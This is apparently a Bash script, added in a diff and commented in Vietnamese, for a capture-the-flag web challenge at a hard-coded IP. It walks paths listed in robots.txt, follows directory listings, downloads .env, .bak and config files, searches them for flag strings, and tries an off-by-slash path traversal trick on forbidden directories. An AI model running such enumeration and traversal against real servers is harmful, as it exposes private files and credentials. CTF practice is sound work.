@@ -1,0 +1,143 @@
+#!/bin/bash
+
+# ==========================================
+# CẤU HÌNH
+# ==========================================
+TARGET="http://103.199.19.99:4253"   # THAY ĐỔI IP/PORT TẠI ĐÂY
+# Ví dụ: TARGET="http://103.123.45.67:8080"
+
+# Danh sách thư mục từ robots.txt
+PATHS=(
+    "/admin-panel/"
+    "/config/"
+    "/super-secret/"
+    "/backup/"
+    "/old-site/"
+    "/login-dev/"
+    "/test-api/"
+    "/archive/"
+    "/temp/"
+    "/do-not-index/"
+)
+
+# Màu sắc cho output
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+CYAN='\033[0;36m'
+NC='\033[0m' # No Color
+
+# User-Agent giả lập trình duyệt
+UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+
+# ==========================================
+# HÀM KIỂM TRA
+# ==========================================
+check_url() {
+    local url="$1"
+    local mode="$2" # "dir" hoặc "file"
+    
+    # Lấy HTTP status code
+    STATUS=$(curl -s -o /dev/null -w "%{http_code}" -A "$UA" --max-time 5 "$url")
+    
+    if [ "$STATUS" == "200" ]; then
+        echo -e "${GREEN}[200 OK]${NC} $url"
+        
+        # Lấy nội dung
+        CONTENT=$(curl -s -A "$UA" --max-time 5 "$url")
+        
+        # Kiểm tra nếu đây là autoindex của Nginx (chứa thẻ <a href>)
+        if echo "$CONTENT" | grep -q "<a href="; then
+            echo -e "    ${CYAN}[Autoindex] Phát hiện danh sách file:${NC}"
+            # Trích xuất các link
+            echo "$CONTENT" | grep -oP '(?<=<a href=")[^"]+' | while read -r link; do
+                # Bỏ qua các link điều hướng
+                if [[ "$link" == "../" || "$link" == "./" || "$link" == "/" ]]; then
+                    continue
+                fi
+                echo -e "      - $link"
+                
+                # Nếu là file có đuôi đáng ngờ, tải về và kiểm tra
+                if [[ "$link" =~ \.(txt|zip|bak|php|json|xml|log|conf|env)$ ]]; then
+                    FILE_URL="${url%/}/$link"
+                    echo -e "    ${YELLOW}[!] Đang kiểm tra file: $FILE_URL${NC}"
+                    FILE_CONTENT=$(curl -s -A "$UA" --max-time 5 "$FILE_URL")
+                    
+                    # Tìm flag
+                    if echo "$FILE_CONTENT" | grep -qiE "flag\{|hutech\{|ctf\{|FLAG\{"; then
+                        echo -e "\n${RED}========================================${NC}"
+                        echo -e "${RED}>>> TÌM THẤY FLAG TRONG: $FILE_URL <<<${NC}"
+                        echo -e "${RED}========================================${NC}"
+                        echo "$FILE_CONTENT" | grep -iE "flag\{|hutech\{|ctf\{"
+                        echo -e "${RED}========================================${NC}\n"
+                    else
+                        # In 3 dòng đầu để xem qua
+                        echo -e "      Nội dung (3 dòng đầu):"
+                        echo "$FILE_CONTENT" | head -n 3 | sed 's/^/        /'
+                    fi
+                fi
+            done
+        else
+            # Nếu không phải autoindex, có thể là trang HTML tĩnh
+            # Kiểm tra xem có flag không
+            if echo "$CONTENT" | grep -qiE "flag\{|hutech\{|ctf\{|FLAG\{"; then
+                echo -e "\n${RED}========================================${NC}"
+                echo -e "${RED}>>> TÌM THẤY FLAG TẠI: $url <<<${NC}"
+                echo -e "${RED}========================================${NC}"
+                echo "$CONTENT" | grep -iE "flag\{|hutech\{|ctf\{"
+                echo -e "${RED}========================================${NC}\n"
+            else
+                echo -e "    ${CYAN}[HTML tĩnh] Không có autoindex. Tiêu đề trang:${NC}"
+                echo "$CONTENT" | grep -oP '(?<=<title>).*?(?=</title>)' | head -n 1 | sed 's/^/      /'
+            fi
+        fi
+        
+    elif [ "$STATUS" == "403" ]; then
+        echo -e "${RED}[403 Forbidden]${NC} $url"
+        echo -e "    ${YELLOW}[*] Thử kỹ thuật Off-by-Slash...${NC}"
+        # Thử thêm .. vào cuối
+        local slash_url="${url%/}../"
+        local slash_status=$(curl -s -o /dev/null -w "%{http_code}" -A "$UA" --max-time 5 "$slash_url")
+        if [ "$slash_status" == "200" ]; then
+            echo -e "    ${GREEN}[+] Off-by-Slash HOẠT ĐỘNG! -> $slash_url ($slash_status)${NC}"
+            check_url "$slash_url" "dir"
+        else
+            echo -e "    ${RED}[-] Off-by-Slash thất bại ($slash_status)${NC}"
+        fi
+        
+    elif [ "$STATUS" == "301" ] || [ "$STATUS" == "302" ]; then
+        REDIRECT=$(curl -s -o /dev/null -w "%{redirect_url}" -A "$UA" --max-time 5 "$url")
+        echo -e "${YELLOW}[$STATUS Redirect]${NC} $url -> ${CYAN}$REDIRECT${NC}"
+        # Tự động theo dõi redirect
+        check_url "$REDIRECT" "dir"
+        
+    elif [ "$STATUS" == "404" ]; then
+        echo -e "${BLUE}[404 Not Found]${NC} $url"
+    else
+        echo -e "${YELLOW}[$STATUS]${NC} $url"
+    fi
+}
+
+# ==========================================
+# BẮT ĐẦU
+# ==========================================
+echo -e "${GREEN}========================================${NC}"
+echo -e "${GREEN}       CRAWLING CTF CHALLENGE          ${NC}"
+echo -e "${GREEN}========================================${NC}"
+echo -e "Target: ${CYAN}$TARGET${NC}\n"
+
+# 1. Kiểm tra sitemap.xml
+echo -e "${YELLOW}--- [1] Kiểm tra Sitemap.xml ---${NC}"
+check_url "${TARGET}/sitemap.xml" "file"
+
+# 2. Kiểm tra từng thư mục trong robots.txt
+echo -e "\n${YELLOW}--- [2] Kiểm tra các thư mục trong robots.txt ---${NC}"
+for path in "${PATHS[@]}"; do
+    check_url "${TARGET}${path}" "dir"
+    echo "" # Dòng trống cho dễ đọc
+done
+
+echo -e "${GREEN}========================================${NC}"
+echo -e "${GREEN}              HOÀN TẤT                   ${NC}"
+echo -e "${GREEN}========================================${NC}"
